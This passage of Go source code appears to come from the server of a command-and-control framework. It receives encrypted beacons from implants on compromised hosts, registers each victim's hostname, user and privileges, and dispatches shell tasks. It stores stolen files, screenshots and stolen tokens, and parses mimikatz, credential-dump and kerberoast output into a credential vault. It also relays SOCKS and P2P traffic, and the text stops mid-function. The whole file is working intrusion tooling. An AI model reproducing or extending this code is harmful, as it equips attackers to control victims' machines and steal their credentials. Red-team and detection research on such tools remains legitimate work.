package server

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"runtime/debug"
	"strconv"
	"strings"
	"time"

	"context"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/pkg/encoding"
	"github.com/forgec2/forgec2/internal/plugin"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"gorm.io/gorm"
)

// Local copies of protocol types (agent package is not importable as it is package main + build constrained)
type beaconRequest struct {
	UUID      string            `json:"uuid"`
	Info      map[string]string `json:"info,omitempty"`
	Results   []taskResult      `json:"results,omitempty"`
	SocksData []socksFrame      `json:"socks_data,omitempty"`
	Relayed   []relayedData     `json:"relayed,omitempty"` // P2P: child results forwarded by parent

	// ECDH + AES-256-GCM fields (forward-secret encryption)
	ECDHPub   string `json:"ecdh_pub,omitempty"`   // base64-encoded X25519 public key
	CipherB64 string `json:"c,omitempty"`           // base64(nonce + AES-256-GCM ciphertext)
}

type relayedData struct {
	AgentID string       `json:"agent_id"` // child agent UUID
	Results []taskResult `json:"results"`
}

type taskResult struct {
	TaskID   uint   `json:"task_id"`
	Type     string `json:"type"`
	Output   string `json:"output"`
	Error    string `json:"error,omitempty"`
	Encoding string `json:"encoding,omitempty"`
	Filename string `json:"filename,omitempty"`
	Size     int64  `json:"size,omitempty"`
	Offset   int64  `json:"offset,omitempty"`
	Path     string `json:"path,omitempty"`
}

type beaconResponse struct {
	Tasks         []task        `json:"tasks"`
	SocksFrames   []socksFrame  `json:"socks_frames,omitempty"`
	SocksFastMode bool          `json:"socks_fast,omitempty"`
	Relayed       []relayedTask `json:"relayed,omitempty"` // P2P: tasks for children

	// ECDH + AES-256-GCM fields
	ECDHPub   string `json:"ecdh_pub,omitempty"`  // base64-encoded server X25519 public key
	CipherB64 string `json:"c,omitempty"`          // base64(nonce + AES-256-GCM ciphertext)
}

type relayedTask struct {
	AgentID string `json:"agent_id"` // child agent UUID
	Tasks   []task `json:"tasks"`
}

type task struct {
	ID      uint   `json:"id"`
	Type    string `json:"type"`
	Command string `json:"command"`
	Shell   string `json:"shell"`
	Path    string `json:"path,omitempty"`
	Data    string `json:"data,omitempty"`
	Offset  int64  `json:"offset,omitempty"`
	Size    int64  `json:"size,omitempty"`
}

func (s *Server) handleBeacon(c *gin.Context) {
	// Step 1: parse the top-level JSON to extract uuid and optional ECDH fields
	raw, err := c.GetRawData()
	if err != nil {
		respondError(c, http.StatusBadRequest, "failed to read body")
		return
	}

	var envelope struct {
		UUID      string `json:"uuid"`
		ECDHPub   string `json:"ecdh_pub,omitempty"`
		CipherB64 string `json:"c,omitempty"`
	}
	if err := json.Unmarshal(raw, &envelope); err != nil {
		respondError(c, http.StatusBadRequest, "invalid json")
		return
	}
	if envelope.UUID == "" {
		envelope.UUID = uuid.New().String()
	}

	// Step 2: establish or use ECDH session
	var req beaconRequest
	useECDH := s.sessionManager != nil && envelope.CipherB64 != ""
	useXOR := s.beaconCipher != nil && !useECDH

	if useECDH {
		// AES-256-GCM encrypted payload via ECDH session
		plaintext, err := s.sessionManager.DecryptB64(envelope.UUID, envelope.CipherB64)
		if err != nil {
			slog.Warn("ECDH decryption failed", "agent", envelope.UUID, "err", err)
			respondError(c, http.StatusBadRequest, "decryption failed")
			return
		}
		if err := encoding.Unmarshal(plaintext, &req); err != nil {
			slog.Warn("ECDH decrypted payload parse failed", "agent", envelope.UUID, "err", err)
			respondError(c, http.StatusBadRequest, "invalid decrypted payload")
			return
		}
		req.UUID = envelope.UUID

	} else if s.sessionManager != nil && envelope.ECDHPub != "" {
		// ECDH handshake: establish a new session
		agentPubKey, err := base64.StdEncoding.DecodeString(envelope.ECDHPub)
		if err != nil {
			slog.Warn("Invalid ECDH public key encoding", "agent", envelope.UUID)
			respondError(c, http.StatusBadRequest, "invalid ecdh key")
			return
		}
		if err := s.sessionManager.EstablishSession(envelope.UUID, agentPubKey); err != nil {
			slog.Warn("ECDH handshake failed", "agent", envelope.UUID, "err", err)
			respondError(c, http.StatusBadRequest, "ecdh handshake failed")
			return
		}
		slog.Info("ECDH session established", "agent", envelope.UUID)
		// Parse inner payload from raw JSON (ECDHPub field is at top level, rest is in body)
		if err := json.Unmarshal(raw, &req); err != nil {
			respondError(c, http.StatusBadRequest, "invalid json")
			return
		}
		req.UUID = envelope.UUID

	} else if useXOR {
		// Legacy XOR stream cipher
		decrypted, err := s.beaconCipher.Decrypt(raw)
		if err != nil {
			respondError(c, http.StatusBadRequest, "decryption failed")
			return
		}
		if err := encoding.Unmarshal(decrypted, &req); err != nil {
			respondError(c, http.StatusBadRequest, "invalid payload after decryption")
			return
		}
	} else {
		// Plaintext mode
		if err := encoding.Unmarshal(raw, &req); err != nil {
			respondError(c, http.StatusBadRequest, "invalid payload")
			return
		}
	}
	req.UUID = envelope.UUID

	publicIP := c.ClientIP()

	resp := s.processBeacon(req, publicIP)

 	// Async GeoIP lookup (don't block beacon response) — only when enabled in config
 	if s.cfg.Server.GeoIPEnabled && publicIP != "" && publicIP != "127.0.0.1" && publicIP != "::1" {
		go func() {
			defer func() { if r := recover(); r != nil { log.Printf("[PANIC RECOVERED] %v\n%s", r, debug.Stack()) } }()
			country, city, lat, lon := s.lookupGeoIP(publicIP)
			if country != "" {
				var agent db.Implant
				if err := s.db.Where("id = ?", req.UUID).First(&agent).Error; err == nil {
					if agent.Country != country || agent.City != city {
						s.db.Model(&agent).Updates(map[string]interface{}{
							"country": country, "city": city,
							"latitude": lat, "longitude": lon,
						})
					}
				}
			}
		}()
	}

	// Build response with appropriate encryption (multi-format)
	respBytes, err := encoding.Marshal(resp)
	if err != nil {
		slog.Error("beacon response marshal failed", "error", err)
		respondError(c, http.StatusInternalServerError, "response marshal failed")
		return
	}

	if useECDH {
		// Encrypt response with ECDH session key
		cipherB64, err := s.sessionManager.EncryptB64(req.UUID, respBytes)
		if err != nil {
			slog.Error("ECDH response encryption failed", "agent", req.UUID, "err", err)
			respondError(c, http.StatusInternalServerError, "encryption failed")
			return
		}

		// Check if session needs rotation
		wrap := beaconResponse{CipherB64: cipherB64}
		if s.sessionManager.NeedsRotation(req.UUID) {
			wrap.ECDHPub = base64.StdEncoding.EncodeToString(s.sessionManager.GetPublicKey())
		}
		c.JSON(http.StatusOK, wrap)

	} else if envelope.ECDHPub != "" {
		// ECDH handshake response: include server's public key
		resp.ECDHPub = base64.StdEncoding.EncodeToString(s.sessionManager.GetPublicKey())
		c.JSON(http.StatusOK, resp)

	} else if useXOR {
		encrypted, err := s.beaconCipher.Encrypt(respBytes)
		if err != nil {
			respondError(c, http.StatusInternalServerError, "encryption failed")
			return
		}
		c.Data(http.StatusOK, "application/octet-stream", encrypted)
	} else if s.cfg.Malleable.Enabled {
		s.applyMalleableProfile(c, respBytes)
	} else {
		c.Data(http.StatusOK, "application/json", respBytes)
	}
}

func decodeBeaconIdentity(info map[string]string) (hostname, username, ip string) {
	if info == nil {
		return "", "", ""
	}
	hostname = info["hostname"]
	username = info["username"]
	ip = info["ip"]
	if info["encoding"] == "base64" {
		if decoded, err := base64.StdEncoding.DecodeString(hostname); err == nil {
			hostname = string(decoded)
		}
		if decoded, err := base64.StdEncoding.DecodeString(username); err == nil {
			username = string(decoded)
		}
		if decoded, err := base64.StdEncoding.DecodeString(ip); err == nil {
			ip = string(decoded)
		}
	}
	return hostname, username, ip
}

func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, now time.Time) (db.Implant, bool) {
	parseInt := func(key string) int {
		if req.Info == nil {
			return 0
		}
		if v, err := strconv.Atoi(req.Info[key]); err == nil {
			return v
		}
		return 0
	}

	var agent db.Implant
	result := s.db.Where("id = ?", req.UUID).First(&agent)
	isNewAgent := result.Error == gorm.ErrRecordNotFound

	if isNewAgent {
		hostname, username, ip := decodeBeaconIdentity(req.Info)
		if strings.TrimSpace(hostname) == "" && strings.TrimSpace(ip) == "" {
			slog.Warn("Rejected ghost agent registration", "uuid", req.UUID, "public_ip", publicIP)
			return db.Implant{}, false
		}

		agent = db.Implant{
			ID:              req.UUID,
			Hostname:        hostname,
			Username:        username,
			OS:              req.Info["os"],
			Arch:            req.Info["arch"],
			IP:              ip,
			PublicIP:        publicIP,
			LastSeen:        now,
			Status:          "online",
			Version:         req.Info["version"],
			PID:             parseInt("pid"),
			ProcessName:     req.Info["process_name"],
			Integrity:       req.Info["integrity"],
			Elevated:        req.Info["elevated"] == "true",
			Domain:          req.Info["domain"],
			CurrentInterval: parseInt("interval"),
			CurrentJitter:   parseInt("jitter"),
			ActiveWindow:    req.Info["active_window"],
		}
		if lid := req.Info["listener_id"]; lid != "" {
			if id, err := strconv.ParseUint(lid, 10, 32); err == nil {
				agent.ListenerID = uint(id)
			}
		}
		if err := s.db.Create(&agent).Error; err != nil {
			slog.Error("Failed to create agent", "id", agent.ID, "error", err)
		}
		slog.Info("New agent registered", "id", agent.ID, "hostname", agent.Hostname, "ip", agent.IP, "listener_id", agent.ListenerID)
		s.broadcastAgentOnline(agent, true)
		s.eventManager.Emit(Event{
			Type:      EventImplantCheckin,
			AgentID:   agent.ID,
			AgentHost: agent.Hostname,
			Timestamp: now,
			Data:      map[string]interface{}{"new": true, "ip": agent.IP},
		})
	} else {
		prevStatus := s.agentStatus(agent).Status
		if agent.Status == "offline" || agent.Status == "stale" {
			prevStatus = agent.Status
		}

		updates := map[string]interface{}{
			"last_seen": now,
			"status":    "online",
		}
		if publicIP != "" && publicIP != agent.PublicIP {
			updates["public_ip"] = publicIP
		}
		if v := req.Info["version"]; v != "" {
			updates["version"] = v
		}
		if v := req.Info["process_name"]; v != "" {
			updates["process_name"] = v
		}
		if v := req.Info["integrity"]; v != "" {
			updates["integrity"] = v
		}
		if v := req.Info["domain"]; v != "" {
			updates["domain"] = v
		}
		if v := req.Info["elevated"]; v != "" {
			updates["elevated"] = v == "true"
		}
		if pid := parseInt("pid"); pid > 0 {
			updates["pid"] = pid
		}
		if interval := parseInt("interval"); interval >= 0 {
			updates["current_interval"] = interval
		}
		if jitter := parseInt("jitter"); jitter >= 0 {
			updates["current_jitter"] = jitter
		}
		if req.Info != nil {
			if v, ok := req.Info["active_window"]; ok {
				updates["active_window"] = v
			}
		}
		if lid := req.Info["listener_id"]; lid != "" {
			if id, err := strconv.ParseUint(lid, 10, 32); err == nil && agent.ListenerID == 0 {
				updates["listener_id"] = uint(id)
			}
		}

		// Atomic update: only update if last_seen hasn't been changed by a concurrent beacon
		updateErr := s.db.Transaction(func(tx *gorm.DB) error {
			txResult := tx.Model(&db.Implant{}).Where("id = ? AND last_seen <= ?", agent.ID, agent.LastSeen).Updates(updates)
			if txResult.Error != nil {
				return txResult.Error
			}
			// Re-read to get consistent state
			return tx.Where("id = ?", agent.ID).First(&agent).Error
		})
		if updateErr != nil {
			slog.Error("Failed to update agent", "id", agent.ID, "error", updateErr)
		}
		agent.LastSeen = now
		agent.Status = "online"

		if prevStatus != "online" {
			s.broadcastAgentOnline(agent, false)
			s.eventManager.Emit(Event{
				Type:      EventImplantCheckin,
				AgentID:   agent.ID,
				AgentHost: agent.Hostname,
				Timestamp: now,
				Data:      map[string]interface{}{"new": false, "reconnected": true, "prev_status": prevStatus, "ip": agent.IP},
			})
		}
		slog.Info("Beacon processed", "agent", req.UUID, "last_seen", now, "public_ip", publicIP, "status", "online", "prev_status", prevStatus)
	}

	return agent, isNewAgent
}

func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid string, now time.Time) {
	// Batch-load all referenced tasks
	taskIDs := make([]uint, 0, len(results))
	taskIDSet := make(map[uint]struct{})
	for _, r := range results {
		if r.TaskID > 0 {
			if _, ok := taskIDSet[r.TaskID]; !ok {
				taskIDs = append(taskIDs, r.TaskID)
				taskIDSet[r.TaskID] = struct{}{}
			}
		}
	}
	var loadedTasks []db.Task
	if len(taskIDs) > 0 {
		if err := s.db.Where("id IN ? AND LOWER(agent_id) = LOWER(?)", taskIDs, uuid).Limit(len(taskIDs)).Find(&loadedTasks).Error; err != nil {
			slog.Error("Failed to batch-load tasks", "agent", uuid, "error", err)
		}
	}
	taskMap := make(map[uint]*db.Task, len(loadedTasks))
	for i := range loadedTasks {
		taskMap[loadedTasks[i].ID] = &loadedTasks[i]
	}

	for _, r := range results {
		if r.Type == "screen_frame" && r.Output != "" {
			if s.IsScreenMonitoring(uuid) {
				s.BroadcastScreenshot(uuid, r.Output)
			}
			continue
		}

		slog.Info("Processing task result", "task_id", r.TaskID, "type", r.Type, "has_output", r.Output != "", "has_error", r.Error != "", "error_message", r.Error)

		task, ok := taskMap[r.TaskID]
		if !ok {
			continue
		}
		task.Status = "completed"
		if r.Error != "" {
			task.Status = "failed"
			task.Error = r.Error
		}
		task.UpdatedAt = now

		// Decrement per-agent pending task counter
		s.agentPendingTasksMu.Lock()
		if s.agentPendingTasks[uuid] > 0 {
			s.agentPendingTasks[uuid]--
		}
		s.agentPendingTasksMu.Unlock()

		// For monitoring control tasks, do not retain them in DB at all
		if r.Type == "screen_stream_start" || r.Type == "screen_stream_stop" {
			task.Result = "processed"
			if err := s.db.Save(task).Error; err != nil {
				slog.Error("Failed to save screen control task", "task_id", task.ID, "error", err)
			}
			s.broadcastTaskUpdate(uuid, *task)
			if err := s.db.Delete(task).Error; err != nil {
				slog.Error("Failed to delete screen control task", "task_id", task.ID, "error", err)
			}
			continue
		}

		// Silent task types: save result for polling but skip WebSocket broadcast
		isSilent := r.Type == "ls"

		if r.Type == "screenshot" && r.Output != "" {
			slog.Info("Processing screenshot result", "agent_uuid", uuid, "task_id", r.TaskID)

			if s.IsScreenMonitoring(uuid) {
				task.Result = "[live screen monitoring - not retained]"
				s.BroadcastScreenshot(uuid, r.Output)
				slog.Info("Screen frame received (monitoring - not saved to file)", "agent", uuid)
			} else {
				// Keep as base64 so the frontend can directly use it in data: URL
				task.Result = r.Output
				s.saveScreenshot(s.cfg.Server.DataDir, uuid, task.ID, r.Output)
			}
		} else if (r.Type == "upload" || r.Type == "download") && r.Encoding == "base64" {
			task.Result = r.Output
		} else {
			if r.Encoding == "base64" && r.Output != "" {
				decoded, err := base64.StdEncoding.DecodeString(r.Output)
				if err == nil {
					task.Result = string(decoded)
				} else {
					task.Result = r.Output
				}
			} else {
				task.Result = r.Output
			}
		}

		// Format token_list_procs results into a readable table
		if r.Type == "token_list_procs" && task.Result != "" {
			task.Result = FormatTokenProcsFromJSON(task.Result)
		}

		// When set_sleep succeeds, update agent's current interval/jitter
		if r.Type == "set_sleep" && task.Status == "completed" {
			parts := strings.Split(task.Command, ",")
			sleepUpdates := map[string]interface{}{}
			if len(parts) >= 1 {
				if v, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil {
					sleepUpdates["current_interval"] = v
				}
			}
			if len(parts) >= 2 {
				if v, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
					sleepUpdates["current_jitter"] = v
				}
			}
		if len(sleepUpdates) > 0 {
			if err := s.db.Model(&db.Implant{}).Where("id = ?", uuid).Updates(sleepUpdates).Error; err != nil {
				slog.Error("Failed to update sleep settings on agent", "agent", uuid, "error", err)
			} else {
				s.broadcastAgentDataUpdate(uuid, sleepUpdates)
			}
		}
		}

		// Auto-parse credential dump results into the vault
		if r.Type == "creds" && task.Status == "completed" && task.Result != "" {
			parseAndStoreCredentials(s.db, uuid, task.Result, task.ID)
			s.eventManager.Emit(Event{
				Type:      EventCredentialFound,
				AgentID:   uuid,
				AgentHost: agent.Hostname,
				AgentIP:   agent.IP,
				Timestamp: now,
				Data:      map[string]interface{}{"source": "creds_dump"},
			})
		}

		// Auto-parse mimikatz results into the credential vault
		if r.Type == "mimikatz" && task.Status == "completed" && task.Result != "" {
			parseAndStoreCredentials(s.db, uuid, task.Result, task.ID)
			s.eventManager.Emit(Event{
				Type:      EventCredentialFound,
				AgentID:   uuid,
				AgentHost: agent.Hostname,
				AgentIP:   agent.IP,
				Timestamp: now,
				Data:      map[string]interface{}{"source": "mimikatz"},
			})
		}

		// Auto-parse kerberoast TGS hashes into the credential vault
		if r.Type == "kerberoast" && task.Status == "completed" && task.Result != "" {
			parseAndStoreKerberoastResults(s.db, uuid, task.Result, task.ID)
			s.eventManager.Emit(Event{
				Type:      EventCredentialFound,
				AgentID:   uuid,
				AgentHost: agent.Hostname,
				AgentIP:   agent.IP,
				Timestamp: now,
				Data:      map[string]interface{}{"source": "kerberoast"},
			})
		}

		// Enforce max result size only for text results (not for images like screenshots)
		if r.Type != "screenshot" && len(task.Result) > MaxResultSize {
			task.Result = truncateString(task.Result, MaxResultSize)
		}
		if err := s.db.Save(task).Error; err != nil {
			slog.Error("Failed to save task result", "task_id", task.ID, "agent", uuid, "type", r.Type, "error", err)
		}
		if !isSilent {
			s.broadcastTaskUpdate(uuid, *task)
		}

		// Task callbacks: POST results to external URL when task completes
		if task.CallbackURL != "" && !task.CallbackSent {
			go func() {
				defer func() {
					if r := recover(); r != nil {
						slog.Error("Task callback panicked", "task_id", task.ID, "recover", r)
					}
				}()
				s.executeTaskCallback(*task, uuid)
			}()
		}

		if s.pluginManager != nil {
			go func() {
				defer func() {
					if r := recover(); r != nil {
						slog.Error("Plugin hook panicked", "agent", uuid, "recover", r)
					}
				}()
				s.pluginManager.ExecuteHook(context.Background(), plugin.Event{
					Type:      plugin.EventTaskCompleted,
					Timestamp: now,
					AgentID:   uuid,
					Payload: map[string]interface{}{
						"task_id":   task.ID,
						"task_type": task.Type,
						"status":    task.Status,
						"error":     task.Error,
					},
				})
			}()
		}

		// ── Token vault: persist steal/make results ───────────────────────────
		if r.Error == "" && task.Result != "" {
			switch r.Type {
			case "token_steal", "token_make", "token_revert", "rev2self":
				go func() {
					defer func() {
						if r := recover(); r != nil {
							slog.Error("Token result processor panicked", "agent", uuid, "recover", r)
						}
					}()
					s.processTokenResult(uuid, r.Type, task.Result)
				}()
			}
		}

		if (r.Type == "shell" || r.Type == "ps") && (r.Output != "" || r.Error != "" || task.Command != "") {
			cmdStr := task.Command
			if cmdStr == "" {
				cmdStr = r.Type
			}
			resultStr := r.Output
			if r.Encoding == "base64" && r.Output != "" {
				if decoded, err := base64.StdEncoding.DecodeString(r.Output); err == nil {
					resultStr = string(decoded)
				}
			}
			if r.Error != "" {
				resultStr = "ERROR: " + r.Error
			}
			if len(resultStr) > AuditLogResultMaxLen {
				resultStr = resultStr[:AuditLogResultMaxLen] + "..."
			}
			details := fmt.Sprintf("cmd: %s | result: %s", cmdStr, resultStr)
			if len(details) > AuditLogDetailsMaxLen {
				details = details[:AuditLogDetailsMaxLen] + "..."
			}
			// c may be nil for TCP transport
			s.LogAuditRecord(nil, "command_result", "agent", uuid, details, r.Error == "", nil)
		}

		if r.Type == "upload" && r.Output != "" {
			uploadBase := filepath.Join(s.cfg.Server.DataDir, "uploads", uuid)
			if err := os.MkdirAll(uploadBase, 0700); err != nil {
				slog.Error("Failed to create uploads dir", "agent", uuid, "error", err)
			}
			filename := r.Filename
			if filename == "" {
				filename = fmt.Sprintf("file_%d", task.ID)
			}
			filePath := safeJoin(uploadBase, filename)
			if filePath == "" {
				task.Result = "ERROR: invalid filename (path traversal blocked)"
				if err := s.db.Save(task).Error; err != nil {
					slog.Error("Failed to save file path traversal error", "task_id", task.ID, "error", err)
				}
				continue
			}
			decoded, err := base64.StdEncoding.DecodeString(r.Output)
			if err == nil {
				f, ferr := os.OpenFile(filePath, os.O_CREATE|os.O_WRONLY, 0600)
				if ferr == nil {
					if r.Offset > 0 || task.Offset > 0 {
						off := r.Offset
						if off == 0 {
							off = task.Offset
						}
						if _, err := f.Seek(off, 0); err != nil {
							f.Close()
							task.Result = fmt.Sprintf("ERROR: seek failed: %v", err)
							if len(task.Result) > MaxResultSize {
								task.Result = truncateString(task.Result, MaxResultSize)
							}
							if err := s.db.Save(task).Error; err != nil {
								slog.Error("Failed to save upload seek error", "task_id", task.ID, "error", err)
							}
							continue
						}
					}
					if _, err := f.Write(decoded); err != nil {
						f.Close()
						task.Result = fmt.Sprintf("ERROR: write failed: %v", err)
						if len(task.Result) > MaxResultSize {
							task.Result = truncateString(task.Result, MaxResultSize)
						}
						if err := s.db.Save(task).Error; err != nil {
							slog.Error("Failed to save upload write error", "task_id", task.ID, "error", err)
						}
						continue
					}
					f.Close()
					task.Result = fmt.Sprintf("File chunk saved: %s offset %d (%d bytes)", filename, r.Offset, r.Size)
					if len(task.Result) > MaxResultSize {
						task.Result = truncateString(task.Result, MaxResultSize)
					}
					if err := s.db.Save(task).Error; err != nil {
						slog.Error("Failed to save upload success", "task_id", task.ID, "error", err)
					}
					slog.Info("File chunk uploaded from agent", "agent", uuid, "file", filename, "offset", r.Offset, "size", r.Size)
				}
			}
		}

		if r.Type == "download" && r.Output != "" && (r.Offset > 0 || task.Offset > 0 || r.Size > 0) {
			uploadBase := filepath.Join(s.cfg.Server.DataDir, "uploads", uuid)
			if err := os.MkdirAll(uploadBase, 0700); err != nil {
				slog.Error("Failed to create uploads dir", "agent", uuid, "error", err)
			}
			filename := r.Filename
			if filename == "" {
				filename = fmt.Sprintf("file_%d", task.ID)
			}
			filePath := safeJoin(uploadBase, filename)
			if filePath == "" {
				task.Result = "ERROR: invalid filename (path traversal blocked)"
				if err := s.db.Save(task).Error; err != nil {
					slog.Error("Failed to save file path traversal error", "task_id", task.ID, "error", err)
				}
				continue
			}
			decoded, err := base64.StdEncoding.DecodeString(r.Output)
			if err == nil {
				f, ferr := os.OpenFile(filePath, os.O_CREATE|os.O_WRONLY, 0600)
				if ferr == nil {
					off := r.Offset
					if off == 0 {
						off = task.Offset
					}
					if off > 0 {
						if _, err := f.Seek(off, 0); err != nil {
							f.Close()
							task.Result = fmt.Sprintf("ERROR: seek failed: %v", err)
							if len(task.Result) > MaxResultSize {
								task.Result = truncateString(task.Result, MaxResultSize)
							}
							if err := s.db.Save(task).Error; err != nil {
								slog.Error("Failed to save download seek error", "task_id", task.ID, "error", err)
							}
							continue
						}
					}
					if _, err := f.Write(decoded); err != nil {
						f.Close()
						task.Result = fmt.Sprintf("ERROR: write failed: %v", err)
						if len(task.Result) > MaxResultSize {
							task.Result = truncateString(task.Result, MaxResultSize)
						}
						if err := s.db.Save(task).Error; err != nil {
							slog.Error("Failed to save download write error", "task_id", task.ID, "error", err)
						}
						continue
					}
					f.Close()
					task.Result = fmt.Sprintf("Download chunk saved: %s offset %d (%d bytes)", filename, off, r.Size)
					if len(task.Result) > MaxResultSize {
						task.Result = truncateString(task.Result, MaxResultSize)
					}
					if err := s.db.Save(task).Error; err != nil {
						slog.Error("Failed to save download success", "task_id", task.ID, "error", err)
					}
					slog.Info("File chunk downloaded from agent", "agent", uuid, "file", filename, "offset", off, "size", r.Size)
				}
			}
		}
	}
}

func (s *Server) processRelayedResults(relayed []relayedData, parentUUID string, now time.Time) {
	// Batch-load all tasks referenced by any relayed child
	relayTaskIDs := make([]uint, 0, len(relayed)*2)
	relayTaskIDSet := make(map[uint]struct{})
	for _, rd := range relayed {
		for _, r := range rd.Results {
			if r.TaskID > 0 {
				if _, ok := relayTaskIDSet[r.TaskID]; !ok {
					relayTaskIDs = append(relayTaskIDs, r.TaskID)
					relayTaskIDSet[r.TaskID] = struct{}{}
				}
			}
		}
	}
	var relayedTasks []db.Task
	if len(relayTaskIDs) > 0 {
		if err := s.db.Where("id IN ?", relayTaskIDs).Limit(len(relayTaskIDs)).Find(&relayedTasks).Error; err != nil {
			slog.Error("Failed to batch-load relayed tasks", "error", err)
		}
	}
	relayTaskMap := make(map[uint]*db.Task, len(relayedTasks))
	for i := range relayedTasks {
		relayTaskMap[relayedTasks[i].ID] = &relayedTasks[i]
	}

	for _, rd := range relayed {
		var childAgent db.Implant
		if err := s.db.Where("id = ? AND parent_id = ?", rd.AgentID, parentUUID).First(&childAgent).Error; err != nil {
			slog.Warn("P2P relay from non-child agent", "parent", parentUUID, "child", rd.AgentID, "error", err)
			continue
		}
		for _, r := range rd.Results {
			task, ok := relayTaskMap[r.TaskID]
			if !ok || !strings.EqualFold(task.AgentID, rd.AgentID) {
				continue
			}
			task.Status = "completed"
			if r.Error != "" {
				task.Status = "failed"
				task.Error = r.Error
			}
			task.UpdatedAt = now

			// Decrement per-agent pending task counter
			s.agentPendingTasksMu.Lock()
			if s.agentPendingTasks[rd.AgentID] > 0 {
				s.agentPendingTasks[rd.AgentID]--
			}
			s.agentPendingTasksMu.Unlock()
			if r.Encoding == "base64" && r.Output != "" {
				decoded, err := base64.StdEncoding.DecodeString(r.Output)
				if err == nil {
					task.Result = string(decoded)
				} else {
					task.Result = r.Output
				}
			} else {
				task.Result = r.Output
			}
			if len(task.Result) > MaxResultSize {
				task.Result = truncateString(task.Result, MaxResultSize)
			}
			if err := s.db.Save(task).Error; err != nil {
				slog.Error("Failed to save relayed task result", "task_id", task.ID, "child", rd.AgentID, "error", err)
			}
			s.broadcastTaskUpdate(rd.AgentID, *task)
			slog.Info("P2P relayed task result processed", "child", rd.AgentID, "task_id", r.TaskID)
		}
		if err := s.db.Model(&childAgent).Update("last_seen", now).Error; err != nil {
			slog.Error("Failed to update child agent last_seen", "child", rd.AgentID, "error", err)
		}
		slog.Info("P2P relayed data processed for child", "parent", parentUUID, "child", rd.AgentID)
	}
}

func (s *Server) fetchPendingTasks(uuid string) []task {
	var pendingTasks []db.Task
	if err := s.db.Where("LOWER(agent_id) = LOWER(?) AND status = ?", uuid, "pending").Order("created_at asc").Limit(BeaconTaskFetchLimit).Find(&pendingTasks).Error; err != nil {
		slog.Error("Failed to fetch pending tasks", "agent", uuid, "error", err)
	}

	slog.Info("Beacon fetching pending tasks", "agent_uuid", uuid, "pending_count", len(pendingTasks))

	if len(pendingTasks) > 0 {
		taskIDs := make([]uint, len(pendingTasks))
		for i, t := range pendingTasks {
			taskIDs[i] = t.ID
			pendingTasks[i].Status = "running"
		}
		if err := s.db.Model(&db.Task{}).Where("id IN ?", taskIDs).Update("status", "running").Error; err != nil {
			slog.Error("Failed to batch update pending tasks to running", "count", len(taskIDs), "error", err)
		}
	}

	tasks := make([]task, len(pendingTasks))
	for i, t := range pendingTasks {
		tasks[i] = task{
			ID:      t.ID,
			Type:    t.Type,
			Command: t.Command,
			Shell:   t.Shell,
			Path:    t.Path,
			Data:    t.Data,
			Offset:  t.Offset,
			Size:    t.Size,
		}
	}
	return tasks
}

func (s *Server) fetchRelayedChildTasks(parentUUID string) []relayedTask {
	var children []db.Implant
	if err := s.db.Where("parent_id = ?", parentUUID).Limit(500).Find(&children).Error; err != nil {
		slog.Error("Failed to fetch child agents", "parent", parentUUID, "error", err)
	}
	if len(children) == 0 {
		return nil
	}

	childIDs := make([]string, len(children))
	for i, c := range children {
		childIDs[i] = c.ID
	}
	var allChildTasks []db.Task
	if err := s.db.Where("LOWER(agent_id) IN ? AND status = ?", childIDs, "pending").Order("created_at asc").Limit(len(children) * BeaconTaskFetchLimit).Find(&allChildTasks).Error; err != nil {
		slog.Error("Failed to fetch pending child tasks", "parent", parentUUID, "error", err)
	}
	tasksByChild := make(map[string][]db.Task, len(children))
	for _, ct := range allChildTasks {
		tasksByChild[ct.AgentID] = append(tasksByChild[ct.AgentID], ct)
	}

	var relayed []relayedTask
	for _, child := range children {
		childTasks := tasksByChild[child.ID]
		if len(childTasks) > 0 {
			rt := relayedTask{AgentID: child.ID}
			childTaskIDs := make([]uint, len(childTasks))
			for i := range childTasks {
				childTasks[i].Status = "running"
				childTaskIDs[i] = childTasks[i].ID
				rt.Tasks = append(rt.Tasks, task{
					ID:      childTasks[i].ID,
					Type:    childTasks[i].Type,
					Command: childTasks[i].Command,
					Shell:   childTasks[i].Shell,
					Path:    childTasks[i].Path,
					Data:    childTasks[i].Data,
					Offset:  childTasks[i].Offset,
					Size:    childTasks[i].Size,
				})
			}
			if err := s.db.Model(&db.Task{}).Where("id IN ?", childTaskIDs).Update("status", "running").Error; err != nil {
				slog.Error("Failed to batch update child tasks to running", "count", len(childTaskIDs), "error", err)
			}
			relayed = append(relayed, rt)
		}
	}
	return relayed
}

func (s *Server) processSOCKSRelay(uuid string, socksData []socksFrame, resp *beaconResponse) {
	// Process relay data coming FROM the agent (includes rportfwd frames)
	if len(socksData) > 0 {
		s.processAgentSocksData(uuid, socksData)
		// Handle rportfwd response frames from agent
		for _, f := range socksData {
			if strings.HasPrefix(f.Action, "rportfwd_") {
				s.processRPortFwdData(uuid, f)
			}
		}
	}
	// Collect pending relay frames going TO the agent
	if frames := s.collectSocksFrames(uuid); len(frames) > 0 {
		resp.SocksFrames = frames
	}
	// Hint agent to use fast polling when SOCKS is active
	if s.hasActiveSocks(uuid) {
		resp.SocksFastMode = true
	}
}

// processBeacon contains the core beacon logic (registration, result processing,
// task dispatch). It is shared between HTTP and TCP transports.
func (s *Server) processBeacon(req beaconRequest, publicIP string) beaconResponse {
	now := time.Now()

	agent, isNew := s.processAgentRegistration(req, publicIP, now)
	if agent.ID == "" {
		return beaconResponse{}
	}

	if s.pluginManager != nil {
		go func() {
			defer func() {
				if r := recover(); r != nil {
					slog.Error("Plugin hook panicked (agent connect)", "agent", req.UUID, "recover", r)
				}
			}()
			s.pluginManager.ExecuteHook(context.Background(), plugin.Event{
				Type:      plugin.EventAgentConnect,
				Timestamp: now,
				AgentID:   req.UUID,
				Payload: map[string]interface{}{
					"hostname": agent.Hostname,
					"ip":       agent.IP,
					"os":       agent.OS,
					"username": agent.Username,
					"new":      isNew,
				},
			})
		}()
	}

	s.processTaskResults(agent, req.Results, req.UUID, now)

	if len(req.Relayed) > 0 {
		s.processRelayedResults(req.Relayed, req.UUID, now)
	}

	resp := beaconResponse{
		Tasks:   s.fetchPendingTasks(req.UUID),
		Relayed: s.fetchRelayedChildTasks(req.UUID),
	}

